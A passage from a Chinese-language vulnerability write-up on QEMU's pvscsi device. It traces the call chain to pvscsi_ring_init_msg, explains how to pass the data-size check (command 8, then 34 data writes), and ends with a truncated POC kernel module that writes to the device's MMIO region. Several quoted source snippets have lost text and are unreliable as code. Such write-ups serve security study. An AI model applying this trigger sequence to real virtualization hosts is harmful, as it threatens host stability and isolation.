           return;
    }
    module_init(m_init);
    module_exit(m_exit);
现再我们知道了怎么才能和设备交互，现再就是要看一下怎么才能调用到漏洞函数了，我选择调用的是`pvscsi_ring_init_msg`函数，这里我用的vscode查找引用功能可以看到只有一个函数调用了它，对调用它的函数再次查找引用，这时什么都查不到了，然后我使用搜索功能搜索到了一个使用调用函数的地方
可以从下图中看到这里把`pvscsi_on_cmd_setup_msg_ring`函数的地址赋给了一个函数指针，那么下面我们就看看哪里使用了这个函数指针
然后找到`pvscsi_do_command_processing`函数使用了函数指针，接下来再找一下哪里调用了`pvscsi_do_command_processing`函数
然后可以发现有两个函数调用了它，并且这两个函数都可以被pvscsi_io_write调用，这两个函数对应着不同的switch分支，所以现再我们就知道了函数的具体调用链
    ----------------------------------------------------------------------------------------------------------------------------    static void
    pvscsi_on_command_data(PVSCSIState *s, uint32_t value)
    {
        size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);
        assert(bytes_arrived curr_cmd_data));
        s->curr_cmd_data[s->curr_cmd_data_cntr++] = value;
        pvscsi_do_command_processing(s);
    }
    ----------------------------------------------------------------------------------------------------------------------------    static void
    pvscsi_on_command(PVSCSIState *s, uint64_t cmd_id)
    {
        if ((cmd_id > PVSCSI_CMD_FIRST) && (cmd_id curr_cmd = cmd_id;
        } else {
            s->curr_cmd = PVSCSI_CMD_FIRST;
            trace_pvscsi_on_cmd_unknown(cmd_id);
        }
        s->curr_cmd_data_cntr = 0;
        s->reg_command_status = PVSCSI_COMMAND_NOT_ENOUGH_DATA;
        pvscsi_do_command_processing(s);
    }
    ----------------------------------------------------------------------------------------------------------------------------    static void
    pvscsi_io_write(void *opaque, hwaddr addr,
                    uint64_t val, unsigned size)
    {
        PVSCSIState *s = opaque;
        switch (addr) {
        case PVSCSI_REG_OFFSET_COMMAND:
            pvscsi_on_command(s, val);
            break;
        case PVSCSI_REG_OFFSET_COMMAND_DATA:
            pvscsi_on_command_data(s, (uint32_t) val);
            break;
        case PVSCSI_REG_OFFSET_INTR_STATUS:
            trace_pvscsi_io_write("PVSCSI_REG_OFFSET_INTR_STATUS", val);
            s->reg_interrupt_status &= ~val;
            pvscsi_update_irq_status(s);
            pvscsi_schedule_completion_processing(s);
            break;
        case PVSCSI_REG_OFFSET_INTR_MASK:
            trace_pvscsi_io_write("PVSCSI_REG_OFFSET_INTR_MASK", val);
            s->reg_interrupt_enabled = val;
            pvscsi_update_irq_status(s);
            break;
        case PVSCSI_REG_OFFSET_KICK_NON_RW_IO:
            trace_pvscsi_io_write("PVSCSI_REG_OFFSET_KICK_NON_RW_IO", val);
            pvscsi_process_io(s);
            break;
        case PVSCSI_REG_OFFSET_KICK_RW_IO:
            trace_pvscsi_io_write("PVSCSI_REG_OFFSET_KICK_RW_IO", val);
            pvscsi_process_io(s);
            break;
        case PVSCSI_REG_OFFSET_DEBUG:
            trace_pvscsi_io_write("PVSCSI_REG_OFFSET_DEBUG", val);
            break;
        default:
            trace_pvscsi_io_write_unknown(addr, size, val);
            break;
        }
    }
    ----------------------------------------------------------------------------------------------------------------------------    
知道了调用链后我们来分析一下调用链中的函数，来确定是否有一些check会使我们无法调用到漏洞函数，首先我们可以在调用链函数中发现`pvscsi_do_command_processing`函数中会调用handler_fn这个函数指针指向的函数，只不过调用哪个函数是由`s->curr_cmd`决定的
    static void
    pvscsi_do_command_processing(PVSCSIState *s)
    {
        size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);
        assert(s->curr_cmd = pvscsi_commands[s->curr_cmd].data_size) {
            s->reg_command_status = pvscsi_commands[s->curr_cmd].handler_fn(s);  curr_cmd = PVSCSI_CMD_FIRST;
            s->curr_cmd_data_cntr   = 0;
        }
    }
调用哪个函数由`s->curr_cmd`决定，那么我们就需要看一下我们是否可以控制`s->curr_cmd`的值，对应的我们可以在漏洞调用链函数中看到`pvscsi_on_command`函数中可以对`s->curr_cmd`并且赋的值只要小于10大于0即可，然后我们需要确定一下我们要触发的漏洞函数需要`s->curr_cmd`的值为多少才可以触发
    enum PVSCSICommands {
        PVSCSI_CMD_FIRST             = 0, /* has to be first */
        PVSCSI_CMD_ADAPTER_RESET     = 1,
        PVSCSI_CMD_ISSUE_SCSI        = 2,
        PVSCSI_CMD_SETUP_RINGS       = 3,
        PVSCSI_CMD_RESET_BUS         = 4,
        PVSCSI_CMD_RESET_DEVICE      = 5,
        PVSCSI_CMD_ABORT_CMD         = 6,
        PVSCSI_CMD_CONFIG            = 7,
        PVSCSI_CMD_SETUP_MSG_RING    = 8,
        PVSCSI_CMD_DEVICE_UNPLUG     = 9,
        PVSCSI_CMD_LAST              = 10  /* has to be last */
    };
    static void
    pvscsi_on_command(PVSCSIState *s, uint64_t cmd_id)
    {
        if ((cmd_id > PVSCSI_CMD_FIRST) && (cmd_id curr_cmd = cmd_id;
        } else {
            s->curr_cmd = PVSCSI_CMD_FIRST;
            trace_pvscsi_on_cmd_unknown(cmd_id);
        }
        s->curr_cmd_data_cntr = 0;
        s->reg_command_status = PVSCSI_COMMAND_NOT_ENOUGH_DATA;
        pvscsi_do_command_processing(s);
    }
回到pvscso_commands这个数据结构上来，我们需要触发的函数是`pvscsi_on_cmd_setup_msg_ring`，可以看到这个函数的位置是由`PVSCSI_CMD_SETUP_MSG_RING`决定的，然后我们可以在枚举`PVSCSICommands`里面看到`PVSCSI_CMD_SETUP_MSG_RING`的值为8，也就是说`s->curr_cmd`的值为8时就可以触发到漏洞函数
    enum PVSCSICommands {
        PVSCSI_CMD_FIRST             = 0, /* has to be first */
        PVSCSI_CMD_ADAPTER_RESET     = 1,
        PVSCSI_CMD_ISSUE_SCSI        = 2,
        PVSCSI_CMD_SETUP_RINGS       = 3,
        PVSCSI_CMD_RESET_BUS         = 4,
        PVSCSI_CMD_RESET_DEVICE      = 5,
        PVSCSI_CMD_ABORT_CMD         = 6,
        PVSCSI_CMD_CONFIG            = 7,
        PVSCSI_CMD_SETUP_MSG_RING    = 8,
        PVSCSI_CMD_DEVICE_UNPLUG     = 9,
        PVSCSI_CMD_LAST              = 10  /* has to be last */
    };
    static const struct {
        int       data_size;
        uint64_t  (*handler_fn)(PVSCSIState *s);
    } pvscsi_commands[] = {
        [PVSCSI_CMD_FIRST] = {
            .data_size = 0,
            .handler_fn = pvscsi_on_cmd_unknown,
        },
        /* Not implemented, data size defined based on what arrives on windows */
        [PVSCSI_CMD_CONFIG] = {
            .data_size = 6 * sizeof(uint32_t),
            .handler_fn = pvscsi_on_cmd_config,
        },
        /* Command not implemented, data size is unknown */
        [PVSCSI_CMD_ISSUE_SCSI] = {
            .data_size = 0,
            .handler_fn = pvscsi_on_issue_scsi,
        },
        /* Command not implemented, data size is unknown */
        [PVSCSI_CMD_DEVICE_UNPLUG] = {
            .data_size = 0,
            .handler_fn = pvscsi_on_cmd_unplug,
        },
        [PVSCSI_CMD_SETUP_RINGS] = {
            .data_size = sizeof(PVSCSICmdDescSetupRings),
            .handler_fn = pvscsi_on_cmd_setup_rings,
        },
        [PVSCSI_CMD_RESET_DEVICE] = {
            .data_size = sizeof(struct PVSCSICmdDescResetDevice),
            .handler_fn = pvscsi_on_cmd_reset_device,
        },
        [PVSCSI_CMD_RESET_BUS] = {
            .data_size = 0,
            .handler_fn = pvscsi_on_cmd_reset_bus,
        },
        [PVSCSI_CMD_SETUP_MSG_RING] = {
            .data_size = sizeof(PVSCSICmdDescSetupMsgRing),
            .handler_fn = pvscsi_on_cmd_setup_msg_ring,
        },
        [PVSCSI_CMD_ADAPTER_RESET] = {
            .data_size = 0,
            .handler_fn = pvscsi_on_cmd_adapter_reset,
        },
        [PVSCSI_CMD_ABORT_CMD] = {
            .data_size = sizeof(struct PVSCSICmdDescAbortCmd),
            .handler_fn = pvscsi_on_cmd_abort,
        },
    };
但是当我们给`s->curr_cmd`赋值为8的时候依然无法调用到漏洞函数，这里是因为`pvscsi_do_command_processing`函数里面还有一个检测，这里可以看到需要`bytes_arrived`大于等于`pvscsi_commands[s->curr_cmd].data_size`，然后在动调的时候可以看到`pvscsi_commands[s->curr_cmd].data_size`的值为136，然后`s->curr_cmd_data_cntr`的值在每一次调用`pvscsi_on_command_data`函数的时候都会加1，所以也就是说我们需要调用`136
/ 4 =
34`次`pvscsi_on_command_data`函数才可以使得`bytes_arrived`大于等于`pvscsi_commands[s->curr_cmd].data_size`，从而调用到漏洞函数
    size_t bytes_arrived = s->curr_cmd_data_cntr * sizeof(uint32_t);
    if (bytes_arrived >= pvscsi_commands[s->curr_cmd].data_size) {
        s->reg_command_status = pvscsi_commands[s->curr_cmd].handler_fn(s);
        .........
    }
现再我们已经知道了漏洞调用链，还有相关的check怎么绕过，所有的准备工作都已经做好了，下面就是需要来分析一下具体代码应该怎么写了
第一步就是要现设置`s->curr_cmd`的值为8
第二步调用34次`pvscsi_on_command_data`函数，每次写的`val`都写的大一些最后第34次调用的时候就可以触发到漏洞函数
这里还有一点需要注意一下，就是如果选择了`pvscsi_ring_init_msg`函数作为最后要触发的函数的话，这个函数里面有一行代码会根据我们输入的`val`计算一个值存在`len_log2`里面，但是这里给它赋值是通过循环复制的，如果说我们每次写的`val`过大就会循环好久，所以我们的val也不能写的过大
## POC
POC代码如下：
    #include 
    #include 
    #include 
    #include 
    #define PVSCSI_REG_OFFSET_COMMAND_DATA 4
    uint64_t pmem;
    static void poc(void){
        printk("Hacking\n");
        pmem = ioremap(0xfebf0000,0x8000);
        int i=0;
        writel(0x8,pmem);
        for(i=0;i